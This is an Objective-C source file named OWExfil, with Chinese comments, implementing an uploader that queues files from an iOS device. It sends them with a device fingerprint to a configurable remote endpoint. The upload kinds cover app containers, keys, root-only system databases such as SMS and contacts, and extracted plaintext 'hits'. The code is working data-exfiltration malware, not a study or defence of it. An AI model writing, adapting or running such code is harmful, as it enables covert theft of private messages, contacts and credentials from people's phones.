#import "OWExfil.h"
#import "OWCommon.h"

NSString * const OWUploadKindContainer = @"container";
NSString * const OWUploadKindKeys      = @"keys";
NSString * const OWUploadKindMeta      = @"meta";
NSString * const OWUploadKindSystem    = @"system";    // 系统库（短信/通讯录…），需 root
NSString * const OWUploadKindHits      = @"hits";      // 端上抽取出的明文命中

@implementation OWUploader {
    NSMutableArray<NSString *> *_queue;
}

+ (NSString *)activeEndpoint {
    NSString *override = [[NSUserDefaults standardUserDefaults]
                          stringForKey:@"OWUploadEndpointOverride"];
    if (override.length) return override;
    NSString *plist = [[NSBundle mainBundle] infoDictionary][@"OWUploadEndpoint"];
    return plist.length ? plist : @"";
}

- (instancetype)init {
    if (self = [super init]) {
        NSArray *docs = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
        NSString *docDir = docs.firstObject ?: NSTemporaryDirectory();
        _pendingDir = [docDir stringByAppendingPathComponent:@"pending"];
        [[NSFileManager defaultManager] createDirectoryAtPath:_pendingDir
                                  withIntermediateDirectories:YES attributes:nil error:nil];
        _maxRetries = 3;
        _endpoint = [OWUploader activeEndpoint];
        if (!_endpoint.length) {
            OWLog(@"上传: 未配置 OWUploadEndpoint（Info.plist 为空且无覆盖）");
        } else {
            OWLog(@"上传: 端点 = %@", _endpoint);
        }
        _queue = [self _loadQueue];
    }
    return self;
}

- (NSMutableArray<NSString *> *)_loadQueue {
    NSMutableArray *q = [NSMutableArray new];
    NSDirectoryEnumerator *en = [[NSFileManager defaultManager] enumeratorAtPath:_pendingDir];
    for (NSString *f in en) {
        if ([f.pathExtension isEqualToString:@"meta"]) [q addObject:[_pendingDir stringByAppendingPathComponent:f]];
    }
    return q;
}

- (BOOL)enqueueManifest:(NSDictionary *)manifest error:(NSError **)error {
    NSString *p = [_pendingDir stringByAppendingPathComponent:@"manifest.json"];
    NSData *d = [NSJSONSerialization dataWithJSONObject:manifest options:0 error:nil];
    [d writeToFile:p atomically:YES];
    return [self enqueueFile:p kind:OWUploadKindMeta error:error];
}

- (BOOL)enqueueFile:(NSString *)path kind:(NSString *)kind error:(NSError **)error {
    if (![[NSFileManager defaultManager] fileExistsAtPath:path]) {
        if (error) *error = [NSError errorWithDomain:@"OWUploader" code:50
                                userInfo:@{NSLocalizedDescriptionKey: @"文件不存在"}];
        return NO;
    }
    NSString *base = [NSString stringWithFormat:@"%@_%@", @((uint64_t)[[NSDate date] timeIntervalSince1970]), path.lastPathComponent];
    NSString *dst = [_pendingDir stringByAppendingPathComponent:base];
    [[NSFileManager defaultManager] removeItemAtPath:dst error:nil];
    if (![[NSFileManager defaultManager] copyItemAtPath:path toPath:dst error:error]) return NO;

    NSDictionary *meta = @{@"src": path, @"kind": kind, @"retries": @0, @"done": @NO};
    NSString *metaPath = [dst stringByAppendingPathExtension:@"meta"];
    [[NSJSONSerialization dataWithJSONObject:meta options:0 error:nil] writeToFile:metaPath atomically:YES];
    [_queue addObject:metaPath];
    OWLog(@"上传: 入队 %@ (%@)", path.lastPathComponent, kind);
    return YES;
}

- (BOOL)flush:(NSError **)error {
    if (!_endpoint.length) {
        if (error) *error = [NSError errorWithDomain:@"OWUploader" code:51
                                userInfo:@{NSLocalizedDescriptionKey: @"未配置 OWUploadEndpoint"}];
        OWLog(@"上传: 未配置 endpoint，数据留在 pending 待补传");
        return NO;
    }

    NSURL *url = [NSURL URLWithString:_endpoint];
    if (!url) return NO;

    for (NSString *metaPath in [_queue copy]) {
        NSMutableDictionary *meta = [[NSJSONSerialization JSONObjectWithData:
                                      [NSData dataWithContentsOfFile:metaPath] options:0 error:nil] mutableCopy];
        if (!meta || [meta[@"done"] boolValue]) continue;

        NSString *file = [metaPath stringByDeletingPathExtension];
        if (![[NSFileManager defaultManager] fileExistsAtPath:file]) continue;

        NSNumber *retries = meta[@"retries"] ?: @0;
        if ([retries unsignedIntegerValue] >= self.maxRetries) { OWLog(@"上传: 超出重试上限 %@", file.lastPathComponent); continue; }

        BOOL ok = [self _post:file url:url kind:meta[@"kind"]];
        if (ok) {
            meta[@"done"] = @YES;
            [[NSJSONSerialization dataWithJSONObject:meta options:0 error:nil] writeToFile:metaPath atomically:YES];
            [[NSFileManager defaultManager] removeItemAtPath:file error:nil];
            _uploadedCount++;
            OWLog(@"上传: 成功 %@", file.lastPathComponent);
        } else {
            meta[@"retries"] = @([retries unsignedIntegerValue] + 1);
            [[NSJSONSerialization dataWithJSONObject:meta options:0 error:nil] writeToFile:metaPath atomically:YES];
            _failedCount++;
            OWLog(@"上传: 失败 %@（第 %@ 次）", file.lastPathComponent, meta[@"retries"]);
        }
    }

    return _uploadedCount > 0;
}

- (BOOL)_post:(NSString *)file url:(NSURL *)url kind:(NSString *)kind {
    NSString *boundary = [@"OWBoundary" stringByAppendingString:@((uint64_t)[[NSDate date] timeIntervalSince1970]).stringValue];
    NSMutableURLRequest *req = [NSMutableURLRequest requestWithURL:url];
    req.HTTPMethod = @"POST";
    [req setValue:[NSString stringWithFormat:@"multipart/form-data; boundary=%@", boundary] forHTTPHeaderField:@"Content-Type"];
    [req setTimeoutInterval:60];

    NSMutableData *body = [NSMutableData data];
    OWDeviceProfile *dev = [OWDeviceProfile current];
    NSDictionary *fields = @{@"kind": kind ?: @"unknown",
                             @"machine": dev.machine,
                             @"os": dev.osVersion,
                             @"soc": dev.socTierName,
                             @"bmh": dev.bootManifestHash ?: @""};
    for (NSString *k in fields) {
        [body appendData:[[NSString stringWithFormat:@"--%@\r\nContent-Disposition: form-data; name=\"%@\"\r\n\r\n%@\r\n",
                           boundary, k, fields[k]] dataUsingEncoding:NSUTF8StringEncoding]];
    }
    [body appendData:[[NSString stringWithFormat:@"--%@\r\nContent-Disposition: form-data; name=\"file\"; filename=\"%@\"\r\nContent-Type: application/octet-stream\r\n\r\n",
                       boundary, file.lastPathComponent] dataUsingEncoding:NSUTF8StringEncoding]];
    [body appendData:[NSData dataWithContentsOfFile:file]];
    [body appendData:[[NSString stringWithFormat:@"\r\n--%@--\r\n", boundary] dataUsingEncoding:NSUTF8StringEncoding]];

    dispatch_semaphore_t sem = dispatch_semaphore_create(0);
    __block BOOL ok = NO;
    NSURLSessionUploadTask *task = [[NSURLSession sharedSession] uploadTaskWithRequest:req fromData:body
        completionHandler:^(NSData *d, NSURLResponse *r, NSError *e) {
            NSHTTPURLResponse *hr = (NSHTTPURLResponse *)r;
            ok = (e == nil) && hr.statusCode >= 200 && hr.statusCode < 300;
            if (e) OWLog(@"上传: 网络错误 %@", e.localizedDescription);
            else if (!ok) OWLog(@"上传: HTTP %ld", (long)hr.statusCode);
            dispatch_semaphore_signal(sem);
        }];
    [task resume];
    dispatch_semaphore_wait(sem, dispatch_time(DISPATCH_TIME_NOW, 70 * NSEC_PER_SEC));
    return ok;
}

@end
